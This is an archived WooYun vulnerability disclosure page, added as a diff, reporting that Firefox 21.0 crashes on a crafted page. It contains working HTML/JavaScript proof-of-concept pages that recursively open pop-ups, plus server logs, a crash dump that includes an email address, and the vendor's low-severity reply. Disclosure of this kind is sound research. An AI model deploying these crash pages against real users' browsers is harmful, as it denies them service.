@@ -1,0 +1,301 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		火狐浏览器21.0打开特定网页可能导致拒绝服务问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		火狐浏览器21.0打开特定网页可能导致拒绝服务问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-06-30 13:43</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-04：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-21：	细节向普通白帽子公开<br/>
+									2013-08-10：	细节向实习白帽子公开<br/>
+									2013-09-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">火狐浏览器21.0拒绝服务问题，打开某些恶意构造的网页可能导致火狐直接崩溃。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">打开如下页面会导致火狐崩溃，ie，chrome无影响，建议厂商修复一下^ ^<br />
+<br />
+<br />
+<br />
+以下代码放在http://lno.pw/exp1.htm处<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;script&gt;<br />
+function test(){<br />
+window.onerror=new Function(&quot;history.go(-1)&quot;);<br />
+window.open(&#039;http://lno.pw/exp1.htm&#039;);<br />
+test();<br />
+}<br />
+<br />
+test();<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+以下代码放在http://lno.pw/exp2.htm处：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;script&gt;<br />
+function test(){<br />
+//window.onerror=new Function(&quot;history.go(-1)&quot;);<br />
+window.open(&#039;http://lno.pw/exp1.htm&#039;);<br />
+test();<br />
+}<br />
+<br />
+test();<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+访问http://lno.pw/exp1.htm 然后访问http://lno.pw/exp2.htm </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">打开以后，程序失去响应，然后崩溃。(火狐拦截弹出窗口功能打开状态)<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+估计是因为Firefox阻止了页面的弹窗，所以脚本产生了异常，例如<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;script&gt;<br />
+function x(){alert(33);}<br />
+<br />
+function test(){<br />
+window.onerror=x();<br />
+window.open(&#039;http://lno.pw/&#039;);<br />
+<br />
+}<br />
+<br />
+test();<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+被拦截弹窗后，会弹出“33”的对话框<br />
+<br />
+<br />
+<br />
+查看服务器日志，只有一个exp1.htm/ exp2.htm的请求，所以应该是全部都被拦截了<br />
+<br />
+<br />
+<br />
+58.242.246.14 - - [29/Jun/2013:23:41:52 +0800] &quot;GET /exp1.htm HTTP/1.1&quot; 200 149 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0&quot;<br />
+<br />
+58.242.246.14 - - [29/Jun/2013:23:42:05 +0800] &quot;GET /exp2.htm HTTP/1.1&quot; 200 199 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0&quot;<br />
+<br />
+<br />
+<br />
+而上述代码则会不断的刷新页面并且生成弹窗请求，如果计算机速度够快这儿应该不会弹出来页面脚本正忙的提示，有可能exp1.htm下就会崩溃，即使exp1.htm没有崩溃，打开exp2.htm的时候，貌似也达到了它的计数器上限，之后火狐就崩溃了，在自己的机器和同学的机器上都测试过会崩溃<br />
+<br />
+<br />
+<br />
+同学机子上的效果：<br />
+<br />
+</p><p class="detail"><a href="../images/30000146dd9c0577465f9d920c2e64d9b2287c76.jpg" target="_blank"><img src="../images/30000146dd9c0577465f9d920c2e64d9b2287c76.jpg" alt="123123.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+我的机子上的效果：<br />
+<br />
+http://v.youku.com/v_show/id_XNTc3MDEzNzQ0.html<br />
+<br />
+密码是abc<br />
+<br />
+<br />
+<br />
+崩溃信息：<br />
+<br />
+<br />
+<br />
+</p><pre><code>AdapterDeviceID: 0x0046<br />
+AdapterVendorID: 0x8086<br />
+Add-ons: coba%40mozilla.com.cn:1.0.13,netvideohunter%40netvideohunter.com:1.9.5,personas%40christopher.beard:2.0.0,pig1717%40gmail.com:1.1.3.1,qqmail_plugin_for_firefox%40tencent.com:1.0.0.9,txftn%40tencent.com:1.0.0.6,undoclosedtabsbutton%40supernova00.biz:3.7.1,%7B097d3191-e6fa-4728-9826-b533d755359d%7D:0.7.18,%7B66E978CD-981F-47DF-AC42-E3CF417C1467%7D:0.4.3,%7Bbb6bc1bb-f824-4702-90cd-35e2fb24f25d%7D:1.5.1.1,%7B9c51bd27-6ed8-4000-a2bf-36cb95c0c947%7D:11.0.1,%7B8f8fe09b-0bd3-4470-bc1b-8cad42b8203a%7D:0.17,xssme%40security.compass:0.4.6,%7B455D905A-D37C-4643-A9E2-F6FEFAA0424A%7D:0.8.16,tabimprovelite%40mozillaonline.com:1.7,cpmanager%40mozillaonline.com:0.6.26,firegestures%40xuldev.org:1.7.6,%7B972ce4c6-7e08-4474-a285-3208198ce6fd%7D:21.0,firebug%40software.joehewitt.com:1.11.4<br />
+AvailablePageFile: 12232658944<br />
+AvailablePhysicalMemory: 3943645184<br />
+AvailableVirtualMemory: 3502358528<br />
+BuildID: 20130511120803<br />
+CrashTime: 1372520538<br />
+EMCheckCompatibility: true<br />
+Email: 50189695@qq.com<br />
+FramePoisonBase: 00000000f0de0000<br />
+FramePoisonSize: 65536<br />
+InstallTime: 1369281773<br />
+Notes: AdapterVendorID: 0x8086, AdapterDeviceID: 0x0046, AdapterSubsysID: 396c17aa, AdapterDriverVersion: 8.15.10.2993<br />
+Has dual GPUs. GPU #2: AdapterVendorID2: 0x10de, AdapterDeviceID2: 0x0a29, AdapterSubsysID2: 396c17aa, AdapterDriverVersion2: 9.18.13.697<br />
+ProductID: {ec8030f7-c20a-464f-9b0e-13a3a9e97384}<br />
+ProductName: Firefox<br />
+ReleaseChannel: release<br />
+SecondsSinceLastCrash: 819<br />
+StartupTime: 1372519732<br />
+SystemMemoryUsePercentage: 52<br />
+Theme: classic/1.0<br />
+Throttleable: 1<br />
+TotalVirtualMemory: 4294836224<br />
+URL: about:blank<br />
+Vendor: Mozilla<br />
+Version: 21.0<br />
+Winsock_LSP: MSAFD Tcpip [TCP/IPv6] : 2 : 1 : %SystemRoot%\system32\mswsock.dll <br />
+ MSAFD Tcpip [UDP/IPv6] : 2 : 2 :  <br />
+ MSAFD Tcpip [RAW/IPv6] : 2 : 3 : %SystemRoot%\system32\mswsock.dll <br />
+ MSAFD Tcpip [TCP/IP] : 2 : 1 :  <br />
+ MSAFD Tcpip [UDP/IP] : 2 : 2 : %SystemRoot%\system32\mswsock.dll <br />
+ MSAFD Tcpip [RAW/IP] : 2 : 3 :  <br />
+ RSVP TCPv6 服务提供商 : 2 : 1 : %SystemRoot%\system32\mswsock.dll <br />
+ RSVP TCP 服务提供商 : 2 : 1 :  <br />
+ RSVP UDPv6 服务提供商 : 2 : 2 : %SystemRoot%\system32\mswsock.dll <br />
+ RSVP UDP 服务提供商 : 2 : 2 :  <br />
+ MSAFD RfComm [Bluetooth] : 2 : 1 : %SystemRoot%\system32\mswsock.dll <br />
+ VMCI sockets DGRAM : 0 : 2 :  <br />
+ VMCI sockets STREAM : 0 : 1 : %SystemRoot%\system32\vsocklib.dll<br />
+<br />
+此报告同时包含了应用程序崩溃时状态的技术信息。</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">建议不要记录那么多的弹出窗口记录，比如Chrome貌似就记录了最后的100个（只是貌似，小菜我是目测的＝ ＝） </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027215" title="火狐浏览器21.0打开特定网页可能导致拒绝服务问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-07-01 11:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">经分析，测试页面存在明显的、非正常的javascript脚本，当火狐打开该页面时调用这些脚本引发用户浏览器死锁以致崩溃。<br />
+我们认为，从这个问题的触发方式、涉及范围、实际影响以及造成的危害来看，还未达到“浏览器漏洞”的高度。<br />
+不过类似的问题报告确实可以促进浏览器更加强壮。希望继续努力共建互联网世界。<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27215";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
